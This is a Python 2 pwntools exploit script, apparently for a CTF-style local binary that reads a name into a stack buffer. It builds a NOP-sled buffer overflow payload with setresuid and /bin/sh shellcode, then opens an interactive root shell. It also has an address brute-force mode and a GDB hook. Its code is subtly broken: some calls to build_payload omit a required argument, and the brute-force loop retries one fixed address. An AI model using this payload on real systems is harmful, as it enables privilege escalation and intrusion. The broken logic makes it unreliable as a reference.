#!/usr/bin/env python2
# -*- coding: utf-8 -*-
import sys
from pwn import log, context
from pwnlib.args import args
from pwnlib.util import packing
from pwnlib import shellcraft
from pwnlib.tubes.process import process, PTY
from pwnlib.asm import asm
from pwnlib.gdb import debug, attach
from pwnlib.log import getLogger

#getLogger('pwnlib.tubes.process').setLevel('ERROR')
#getLogger('pwnlib').setLevel('ERROR')


context.arch = 'i386'
context.aslr = False


def build_payload(address_name_buffer, offset_to_eip):
    offset_to_shellcode = offset_to_eip + 0x4
    nop = asm(shellcraft.i386.nop())

    payload  = b''
    payload += nop * offset_to_eip
    payload += packing.p32(address_name_buffer + offset_to_shellcode)
    payload += asm(shellcraft.i386.syscalls.setresuid())
    payload += asm(shellcraft.i386.sh())

    return payload

def launch_prog(prog):
    env = {}

    p = process(prog, stdin=PTY, env=env)
    p.recvregex('What\'s your name\? ', exact=True, timeout=10)

    return p

def poll_prog(prog, address):
    p = launch_prog(prog)
    p.sendline(build_payload(address))

    p.recvline_contains('hello')

    for _ in range(100000):
        status = p.poll()#block=True)
        if status:
            return status, p

    p.close()

    return status, p


if __name__ == '__main__':
    if args.PAYLOAD:
        print build_payload(int(args.PAYLOAD, 16))
        sys.exit(0)

    prog = [sys.argv[1]]
    address = int(sys.argv[2], 16)

    if args.BRUTEFORCE:
        with log.progress('trying to bruteforce \'name\' buffer address') as progress:
            for idx in xrange(0, 0xffff, 0x4):
                address_to_try = 0xffffde10

                progress.status('0x%x', address_to_try)
                status, p = poll_prog(prog, address_to_try)

                if status is None:

                    try:
                        p.sendline('id')
                    except:
                        p.close()
                        continue
                    status = p.poll()
                    if status is None:
                        progress.success('the address is 0x%x', address_to_try)
                        p.interactive()
                    p.close()

        sys.exit(0)

    p = launch_prog(prog)
    #import time;time.sleep(10)
    p.sendline(build_payload(address, 44))
    p.recvline_contains('hello')
    p.interactive()

    if args.GDB:
        attach(p, '''
b main
#b *0x80491ff
c
x/a name
c
''')

